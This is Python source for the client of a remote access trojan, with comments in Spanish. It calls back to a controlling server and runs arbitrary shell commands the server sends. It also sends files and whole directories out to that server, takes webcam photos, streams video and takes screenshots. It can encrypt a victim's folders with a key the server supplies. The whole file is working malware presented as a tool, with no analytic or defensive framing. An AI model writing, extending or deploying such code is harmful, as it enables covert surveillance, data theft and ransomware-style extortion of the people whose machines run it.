## Client
import socket
import os
import getpass
import re
import pickle
import struct
import requests
import cv2
import platform
import pyscreenshot
from time import sleep
from subprocess import Popen, PIPE
from zipfile import ZipFile
from cryptography.fernet import Fernet
from random import randint
from client.udp import UDP

# Clase client-TCP
class TCP:
    # Se inicializa el host, el port y el chunk del programa
    def __init__(self, host, port):
        # host --> standar>localhost
        self.__host = host
        # port --> 1024-65535
        self.__port = port
        self.__newPort = 8888
        # chunk --> 4MB para enviar informacion
        self.__chunk = 4194304
        self.__myOs = platform.system().lower()
        if self.__myOs == "windows":
            self.__home = f"C:\\Users\\{getpass.getuser()}"
        if self.__myOs == "linux":
            self.__home = f"/home/{getpass.getuser()}"
        self.__userName = getpass.getuser()

    def conectar(self):
        # Se inicia el ciclo para crear la conexion
        while True:
            try:
                # Se crea un socket
                self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Se configura el socket
                self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Se intenta conectar al servidor
                self.__sock.connect((self.__host, self.__port))

                sleep(0.05)
                # Se obtiene y se manda la informacion inicial
                userName = getpass.getuser()
                hostName = socket.gethostname()
                currentDir = os.getcwd()
                info = userName + '\n' + hostName + '\n' + currentDir
                self.__sock.send(info.encode())

                break

            except:
                # Si no se consigue una conexion, se espera 5 segundos
                sleep(5)

    def parametros(self, cmd, arg1, arg2=None):
        flags = None
        if arg2 is not None and re.search(arg2, cmd):
            m = re.search(arg2, cmd)
            if m.end() == len(cmd):
                flags = cmd[m.start()+1:m.end()]
                cmd = re.sub(arg2[:-3], '', cmd)
            else:
                flags = cmd[m.start()+1:m.end()-1]
                cmd = re.sub(arg2, ' ', cmd)

        m = re.split(arg1, cmd)
        m.pop(0)
            
        params = {}

        i = 0
        while i < len(m):
            flag = m[i].replace(' ', '')
            flag = flag.replace('=', '')
            params[flag] = m[i+1]
            i += 2

        return params, flags

    # Funcion para regresar el nombre de un archivo o directorio
    # ubicacion --> ubicacion del archivo o directorio
    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def newSock(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(3)
        return sock

    # Funcion para regresar si un archivo es una imagen
    # ubicacion --> ubicacion del archivo
    def isImage(self, ubicacion):
        ext = [".jpg", ".png", ".jpeg", ".webp"]
        imagen = False
        for i in ext:
            if ubicacion.lower().endswith(i):
                imagen = True
                break

        # Se regresa si el archivo es imagen o no
        return imagen

    # Funcion para enviar datos
    # info --> informacion a enviar
    def enviarDatos(self, info, s=None):
        if s == None:
            sock = self.__sock
        else:
            sock = s

        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        sock.sendall(info)

    # Funcion para recibir datos
    def recibirDatos(self, s=None):
        if s == None:
            sock = self.__sock
        else:
            sock = s

        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = sock.recv(self.__chunk)
            if not info:
                raise RuntimeError("Sin informacion")
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += sock.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        # Se regresa la informacion tratada para ser usada
        return info

    # Funcion para enviar un archivo
    # ubicacion --> ubicacion del archivo que se quiere enviar
    def enviarArchivo(self, ubicacion, s=None):
        if s == None:
            sock = self.newSock()
            while True:
                try:
                    sock.connect((self.__host, self.__newPort))
                    break
                except:
                    sleep(0.1)
        else:
            sock = s

        peso = os.path.getsize(ubicacion)
        paquetes = int(peso/self.__chunk)
        sock.send(f"{peso}-{paquetes}".encode())

        if peso > 0:
            ok = sock.recv(8)
            with open(ubicacion, 'rb') as archivo:
                info = archivo.read(self.__chunk)
                while info:
                    try:
                        self.enviarDatos(info, sock)
                        info = archivo.read(self.__chunk)
                        msg = sock.recv(8).decode()
                        if msg == "end":
                            break

                    except:
                        break

            archivo.close()
            if s == None:
                sock.close()

    # Funcion para recibir un archivo
    # ubicacion --> ubicacion en donde se guardara el archivo recibido
    def recibirArchivo(self, ubicacion, s=None):
        if s == None:
            sock = self.newSock()
            while True:
                try:
                    sock.connect((self.__host, self.__newPort))
                    break
                except:
                    sleep(0.1)
        else:
            sock = s

        peso = int(sock.recv(1024).decode())

        if peso > 0:
            with open(ubicacion, 'wb') as archivo:
                sock.send(b'ok')
                while True:
                    try:
                        info = self.recibirDatos(sock)
                        archivo.write(info)

                        if len(info) < self.__chunk:
                            sock.send("end".encode())
                            break
                        else:
                            sock.send("ok".encode())

                    except:
                        break

            archivo.close()
            if s == None:
                sock.close()

    # Funcion para enviar archivos de un directorio
    # origen --> ubicacion del directorio que se quiere enviar
    # index --> indice desde el que se quiere iniciar
    def enviarDirectorio(self, origen, x):
        sock = self.newSock()
        while True:
            try:
                sock.connect((self.__host, self.__newPort))
                break
            except:
                sleep(0.1)

        sock.send(b'ok')
        # Se obtiene el numero de archivos
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                if x == '*':
                    archivos.append(archivo)
                if x != '*' and archivo.endswith(x):
                    archivos.append(archivo)

        sock.recv(8)
        tam = len(archivos)
        sock.send(str(tam).encode())

        # Se comienzan a enviar los archivos
        index = 1
        while index <= tam:
            try:
                nombre = self.getNombre(archivos[index-1])
                peso = os.path.getsize(archivos[index-1])
                paquetes = str(int(peso/self.__chunk))
                info = nombre + '\n' + paquetes + '\n' + str(peso)
                sock.recv(8)
                sock.send(info.encode())

                res = sock.recv(8).decode()
                if res == 'S':
                    self.enviarArchivo(archivos[index-1], sock)
                    sock.send(b"ok")
                elif res == "quit":
                    break
                else:
                    pass

                index += 1

            except:
                break

        sock.close()

    # Funcion para recibir un directorio
    # destino --> directorio en el que se guardaran los archivos
    # index --> indice de referencia
    def recibirDirectorio(self, destino):
        sock = self.newSock()
        while True:
            try:
                sock.connect((self.__host, self.__newPort))
                break
            except:
                sleep(0.1)

        # Si no existe el directorio destino, se crea
        if not os.path.isdir(destino):
            os.mkdir(destino)

        # Se recibe el numero de archivos
        tam = int(sock.recv(64).decode())
        sock.send(b'ok')

        # Se comienzan a recibir los archivos
        index = 1
        while index <= tam:
            try:
                res = sock.recv(8).decode()

                if res == 'S':
                    sock.send(b'ok')
                    nombre = sock.recv(1024).decode()

                    sock.send(b'ok')
                    self.recibirArchivo(f"{destino}/{nombre}", sock)
                    sock.recv(8)

                elif res == "quit":
                    break
                else:
                    pass

                index += 1
                sock.send(b'ok')

            except:
                break

        sock.close()

    # Funcion para cambiar de directorio
    # directorio --> directorio al que se quiere cambiar
    def cd(self, directorio):
        directorio = directorio.replace('~', self.__home) if directorio[0] == '~' else directorio
        if os.path.isdir(directorio):
            try:
                os.chdir(directorio)
                self.__sock.send(os.getcwd().encode())
            except Exception as e:
                self.__sock.send(f"[-] {str(e)}".encode())

        else:
            self.__sock.send(f"[-] error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar un archivo al servidor
    # cmd --> comando recibido
    def sendFileFrom(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
        origen = params['-i']

        if os.path.isfile(origen):
            self.__sock.send(b'ok')
            if '-o' in params.keys():
                pass
            else:
                self.__sock.recv(8)
                nombre = self.getNombre(origen)
                self.__sock.send(nombre.encode())

            self.__sock.recv(8)
            self.enviarArchivo(origen)

        else:
            self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para recibir un archivo del servidor
    # cmd --> comando recibido
    def sendFileTo(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]

        if '-o' in params.keys():
            destino = params['-o']
        else:
            self.__sock.send(b'ok')
            destino = self.__sock.recv(1024).decode()

        self.__sock.send(b'ok')
        self.recibirArchivo(destino)
        self.__sock.send(f"[*] Archivo \"{destino}\" creado".encode())

    # Funcion para enviar una imagen al servidor
    # cmd --> comando recibido
    def image(self, cmd):
        if re.search(r"\s-r\s?", cmd):
            imagenes = []
            for i in os.listdir(os.getcwd()):
                archivo = f"{os.getcwd()}/{i}"
                if os.path.isfile(archivo) and self.isImage(archivo):
                    imagenes.append(archivo)

            num = randint(0, len(imagenes)-1)
            imagen = imagenes[num]

        else:
            params = self.parametros(cmd, r"(\s-[i]+[= ])", r"\s-[xygnmc012789]+\s?")[0]
            imagen = params['-i']

        if os.path.isfile(imagen) and self.isImage(imagen):
            self.__sock.send("[+] info: ok".encode())
            
            self.__sock.recv(8)
            nombre = self.getNombre(imagen)
            self.__sock.send(nombre.encode())

            self.__sock.recv(8)
            archivo = open(imagen, 'rb')
            info = archivo.read()
            archivo.close()
            self.enviarDatos(info)

        else:
            self.__sock.send(f"[!] warning: Imagen \"{imagen}\" no encontrada".encode())

    # Funcion para tomar una foto y enviarla al servidor
    # cmd --> comando recibido
    def pic(self, cmd):
        params = self.parametros(cmd, r"(\s-c[= ])", r"\s-s\s?")[0]
        camara = int(params['-c'])

        if self.__myOs.lower() == "windows":
            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
        else:
            captura = cv2.VideoCapture(camara)

        leido, frame = captura.read()
        captura.release()

        if leido:
            self.__sock.send("[+] info: ok".encode())

            self.__sock.recv(8)
            frame = cv2.imencode(".jpg", frame)[1]
            self.enviarDatos(frame)
        
        else:
            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())

    # Funcion para enviar video de la camara al servidor
    # cmd --> comando recibido
    def captura(self, cmd):
        params = self.parametros(cmd, r"(\s-c[= ])")[0]
        
        camara = int(params['-c'])
        udp = UDP(self.__host, self.__newPort, self.__myOs)

        if self.__myOs == "windows":
            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
        else:
            captura = cv2.VideoCapture(camara)
        leido = captura.read()[0]
        captura.release()

        if leido:
            self.__sock.send("[+] info: ok".encode())
            try:
                udp.conectar()
                self.__sock.recv(8)
                udp.captura(camara)
                udp.close()
                captura.release()
                self.__sock.send("[+] info: client-UDP desconectado".encode())
            except:
                udp.close()
                captura.release()
                self.__sock.send("[+] info: client-UDP desconectado".encode())
        else:
            udp.close()
            captura.release()
            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())

    # Funcion para enviar un directorio al servidor
    # cmd --> comando recibido
    def sendDirFrom(self, cmd):
        params = self.parametros(cmd, r"(\s-[iox]+[= ])", r"\s-a\s?")[0]
        origen = params['-i']
        x = params['-x'] if '-x' in params.keys() else '*'

        if os.path.isdir(origen):
            self.__sock.send("[+] info: ok".encode())

            if '-o' in params.keys():
                pass
            else:
                self.__sock.recv(8)
                nombre = self.getNombre(origen)
                self.__sock.send(nombre.encode())

            self.__sock.recv(8)
            self.enviarDirectorio(origen, x)

        else:
            self.__sock.send(f"[!] warning: Directorio \"{origen}\" no encontrado".encode())

    # Funcion para recibir un directorio del servidor
    # cmd --> comando recibido
    def sendDirTo(self, cmd):
        params = self.parametros(cmd, r"(\s-[iox]+[= ])", r"\s-a\s?")[0]

        if '-o' in params.keys():
            destino = params['-o']
        else:
            self.__sock.send(b'ok')
            destino = self.__sock.recv(1024).decode()

        self.__sock.send(b'ok')
        self.recibirDirectorio(destino)

    # Funcion para comprimir un directorio
    # cmd --> comando recibido
    def comprimir(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
        origen = params['-i']
        directorio = os.getcwd()
        ok = True

        if os.path.isfile(origen):
            cont = 1
            nombre = self.getNombre(origen)
            archivos = [f"{origen}"]
            destino = params['-o'] if '-o' in params.keys() else f"{nombre}.zip"

        elif re.search('/', origen) and not os.path.isdir(origen):
            archivos = origen.split('/')
            cont = len(archivos)
            nombre = self.getNombre(directorio)
            destino = params['-o'] if '-o' in params.keys() else f"{nombre}.zip"

        elif os.path.isdir(origen):
            nombre = self.getNombre(origen)
            destino = params['-o'] if '-o' in params.keys() else f"{nombre}.zip"

            archivos = []
            for i in os.listdir(origen):
                archivo = f"{origen}/{i}"
                if os.path.isfile(archivo):
                    archivos.append(archivo)

        else:
            ok = False
            info = f"error: Error al comprimir el archivo o directorio \"{origen}\""

        if ok:
            destino = destino if destino.endswith('.zip') else f"{destino}.zip"
            comprimidos = 0
            cont = len(archivos)
            with ZipFile(destino, 'w') as zip:
                for i in archivos:
                    if os.path.isfile(i):
                        nombre = self.getNombre(i)
                        zip.write(i, nombre)
                        comprimidos += 1
            zip.close()
            info = f"{comprimidos} elementos comprimidos de {cont}\nArchivo \"{destino}\" creado"

        self.__sock.send(info.encode())

    # Funcion para descomprimir un archivo '.zip'
    # cmd --> comando recibido
    def descomprimir(self, cmd):
        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
        origen = params['-i']

        if '-o' in params.keys():
            destino = params['-o']
        else:
            destino = self.getNombre(origen).replace(".zip", '')

        if os.path.isfile(origen) and origen.endswith(".zip"):
            if not os.path.isdir(destino):
                os.mkdir(destino)

            descomprimidos = 0
            with ZipFile(origen, 'r') as zip:
                for i in zip.namelist():
                    zip.extract(i, destino)
                    descomprimidos += 1
            zip.close()

            self.__sock.send(f"{descomprimidos} elementos descomprimidos".encode())
        else:
            self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para encriptar un directorio
    # cmd --> comando recibido
    def encrypt(self, cmd):
        self.__sock.send(b'ok')
        key = self.__sock.recv(1024)
        params = self.parametros(cmd, r"(\s-[ik]+[= ])")[0]
        directorio = params['-i']

        if not os.path.isdir(directorio):
            self.__sock.send(f"[!] warning: Directorio \"{directorio}\" no encontrado".encode())
            return

        nombre = self.getNombre(directorio)
        self.__sock.send(f"[+] info: ok\n{nombre}".encode())

        res = self.__sock.recv(8).decode()
        if res != 'S':
            self.__sock.send("[!] warning: Encriptacion cancelada".encode())
            return

        try:
            archivos = []
            for i in os.listdir(directorio):
                archivo = f"{directorio}/{i}"
                if os.path.isfile(archivo):
                    archivos.append(archivo)

            with open(f"{directorio}/.info.dat", 'w') as texto:
                f = Fernet(key)
                cont = 0
                for i in archivos:
                    nombre = os.path.basename(i)
                    peso = os.path.getsize(i)
                    if peso > 0:
                        with open(i, 'rb') as archivo:
                            data = archivo.read()
                        archivo.close()

                        dataEncrypt = f.encrypt(data)

                        with open(i, 'wb') as archivo:
                            archivo.write(dataEncrypt)
                        archivo.close()
                        texto.write(f"[+] info: Archivo \"{nombre}\" encriptado\n")
                        cont += 1
            texto.close()

            self.__sock.send(f"[+] info: {cont} archivos encriptados".encode())
            self.__sock.recv(8)
            self.enviarArchivo(f"{directorio}/.info.dat")
            os.remove(f"{directorio}/.info.dat")

        except:
            self.__sock.send("[-] error: Error en el proceso de encriptacion".encode())

    # Funcion para desencriptar un directorio
    # cmd --> comando recibido
    def decrypt(self, cmd):
        self.__sock.send(b'ok')
        key = self.__sock.recv(1024)
        params = self.parametros(cmd, r"(\s-[ik]+[= ])")[0]
        directorio = params['-i']

        if not os.path.isdir(directorio):
            self.__sock.send(f"[!] warning: Directorio \"{directorio}\" no encontrado".encode())
            return

        nombre = self.getNombre(directorio)
        self.__sock.send(f"[+] info: ok\n{nombre}".encode())

        res = self.__sock.recv(8).decode()
        if res != 'S':
            self.__sock.send(f"[!] warning: Desencriptacion cancelada".encode())
            return

        try:
            archivos = []
            for i in os.listdir(directorio):
                archivo = f"{directorio}/{i}"
                if os.path.isfile(archivo):
                    archivos.append(archivo)

            with open(f"{directorio}/.info.dat", 'w') as texto:
                f = Fernet(key)
                cont = 0
                for i in archivos:
                    nombre = os.path.basename(i)
                    peso = os.path.getsize(i)
                    if peso > 0:
                        with open(i, 'rb') as archivo:
                            data = archivo.read()
                        archivo.close()

                        dataDecrypt = f.decrypt(data)

                        with open(i, 'wb') as archivo:
                            archivo.write(dataDecrypt)
                        archivo.close()

                        texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
                        cont += 1
            texto.close()

            self.__sock.send(f"[+] info: {cont} archivos desencriptados".encode())
            self.__sock.recv(8)
            self.enviarArchivo(f"{directorio}/.info.dat")
            os.remove(f"{directorio}/.info.dat")

        except:
            self.__sock.send("[-] error: Error en el proceso de desencriptacion".encode())

    # Funcion para descargar archivos web
    # cmd --> comando recibido
    def wget(self, cmd):
        params = self.parametros(cmd, r"(\s-[nu]+[= ])")[0]
        url = params['-u']
        extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
            "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
        extensionesUpper = [i.upper() for i in extensiones]

        if re.search(r"\s-n[= ]", cmd):
            nombre = params['-n']
            valido = True
        else:
            valido = False
            i = 0
            while i < len(extensiones):
                if re.search(f"[.]{extensiones[i]}", url):
                    valido = True
                    ext = extensiones[i]
                    break
                if re.search(f"[.]{extensionesUpper[i]}", url):
                    valido = True
                    ext = extensionesUpper[i]
                    break
                i += 1

            if valido:
                nombre = re.findall(f"/([\\W\\w]+[.]{ext})", url)[0]
                nombre = nombre.split('/')[-1]

        if valido:
            self.__sock.send("ok".encode())
            try:
                req = requests.get(url)

                with open(nombre, 'wb') as archivo:
                    archivo.write(req.content)
                archivo.close()

                self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())

            except:
                self.__sock.send(f"error: Error al descargar el archivo".encode())
        else:
            self.__sock.send("error: URL no valida".encode())

    # Funcion para enviar al servidor la cantidad de elementos de un directorio
    # cmd --> comando recibido
    def lenDir(self, cmd):
        directorio = cmd[7:]
        if os.path.isdir(directorio):
            self.__sock.send("ok".encode())
            archivos = 0
            directorios = 0
            total = 0

            ok = self.__sock.recv(8)
            for i in os.listdir(directorio):
                elemento = f"{directorio}/{i}"
                if os.path.isfile(elemento):
                    archivos += 1
                if os.path.isdir(elemento):
                    directorios += 1
                total += 1

            info = f"\nElementos: {total}\nDirectorios: {directorios}\nArchivos: {archivos}"
            self.__sock.send(info.encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar a un archivo del servidor la salida de un comando
    # cmd --> comando recibido
    def save(self, cmd):
        self.__sock.send("ok".encode())
        ok = self.__sock.recv(8)
        if cmd[:4] == "open":
            self.enviarDatos("No se puede almacenar informacion".encode())
        else:
            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            info = comando.stdout.read() + comando.stderr.read()
            if self.__myOs == "linux" or self.__myOs == "darwin":
                info = info.decode("utf-8")
            if self.__myOs == "windows":
                info = info.decode("cp850")

            if info == '':
                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
            else:
                i = 0
                while i < len(info):
                    self.enviarDatos(info[i:i+self.__chunk].encode())
                    i += self.__chunk

    def screenShot(self, cmd):
        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
        directorio = params['-d'] if '-d' in params.keys() else '.'

        n = int(params['-n']) if '-n' in params.keys() else 1
        t = float(params['-t']) if '-t' in params.keys() else 0.0

        ubicacion = f"{directorio}/ss.png"
        i = 0
        while i < n:
            screenshot = pyscreenshot.grab()
            screenshot.save(ubicacion)
            self.__sock.send(b'ok')
            self.enviarArchivo(ubicacion)

            os.remove(ubicacion)
            sleep(t)
            i += 1

    # Funcion para recibir y evaluar comandos
    def shell(self):
        while True:
            try:
                cmd = self.__sock.recv(1024).decode() # Se recibe el comando

                # exit
                if cmd.lower() == "exit":
                    try:
                        # Se termina la conexion
                        self.__sock.close()
                        break

                    except:
                        raise Exception('exit error')

                # quit
                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        # Se cierra el socket
                        self.__sock.close()
                        # Y se manda a llamar a la funcion
                        # 'self.conectar'
                        self.conectar()

                    except:
                        raise Exception('quit error')

                # cd
                elif cmd.lower()[:2] == "cd":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.cd'
                        self.cd(cmd[3:])

                    except:
                        raise Exception('cd error')

                # sff
                elif cmd.lower()[:3] == "sff":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileFrom'
                        self.sendFileFrom(cmd)

                    except:
                        raise Exception('sff error')

                # sft
                elif cmd.lower()[:3] == "sft":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileTo'
                        self.sendFileTo(cmd)

                    except:
                        raise Exception('sft error')

                # img
                elif cmd.lower()[:3] == "img":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.image'
                        self.image(cmd)

                    except:
                        raise Exception('img error')

                # pic
                elif cmd.lower()[:3] == "pic":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.pic'
                        self.pic(cmd)

                    except:
                        raise Exception('pic error')

                # cap
                elif cmd.lower()[:3] == "cap":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.captura'
                        self.captura(cmd)

                    except:
                        raise Exception('cap error')

                # sdf
                elif cmd.lower()[:3] == "sdf":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirFrom'
                        self.sendDirFrom(cmd)

                    except:
                        raise Exception('sdf error')

                # sdt
                elif cmd.lower()[:3] == "sdt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirTo'
                        self.sendDirTo(cmd)

                    except:
                        raise Exception('sdt error')

                # zip
                elif cmd.lower()[:3] == "zip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.comprimir'
                        self.comprimir(cmd)

                    except:
                        raise Exception('zip error')

                # unzip
                elif cmd.lower()[:5] == "unzip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.descomprimir'
                        self.descomprimir(cmd)

                    except:
                        raise Exception('unzip error')

                # encrypt
                elif cmd.lower()[:7] == "encrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.encrypt'
                        self.encrypt(cmd)

                    except:
                        raise Exception('encrypt error')

                # decrypt
                elif cmd.lower()[:7] == "decrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.decrypt'
                        self.decrypt(cmd)

                    except:
                        raise Exception('decrypt error')

                # miwget
                elif cmd.lower()[:6] == "miwget":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.wget'
                        self.wget(cmd)

                    except:
                        raise Exception('miwget error')

                # lendir
                elif cmd.lower()[:6] == "lendir":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.lenDir'
                        self.lenDir(cmd)

                    except:
                        raise Exception('lendir error')

                # save
                elif cmd.lower()[:4] == "save":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.save'
                        cmd = cmd[5:]
                        self.save(cmd)

                    except:
                        raise Exception('save error')

                # ss
                elif cmd.lower()[:2] == "ss":
                    try:
                        self.screenShot(cmd)

                    except:
                        raise Exception('ss error')

                # cmd
                else:
                    try:
                        if cmd.lower()[:4] == "open":
                            self.__sock.send("[+] Comando ejecutado".encode())
                            if self.__myOs == "linux" or self.__myOs == "darwin":
                                os.system(cmd[:4].lower() + ' ' + cmd[5:])
                            if self.__myOs == "windows":
                                os.system(cmd[5:])

                        else:
                            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                            info = comando.stdout.read() + comando.stderr.read()
                            if self.__myOs.lower() == "linux" or self.__myOs.lower() == "darwin":
                                info = info.decode("utf-8")
                            if self.__myOs == "windows":
                                info = info.decode("cp850")

                            if info == '':
                                self.enviarDatos("[+] Comando ejecutado --> Salida vacia".encode())

                            else:
                                i = 0
                                while i < len(info):
                                    self.enviarDatos(info[i:i+self.__chunk].encode())
                                    i += self.__chunk

                    except Exception as e:
                        self.__sock.send(f"[-] {str(e)}".encode())

            except:
                self.conectar()

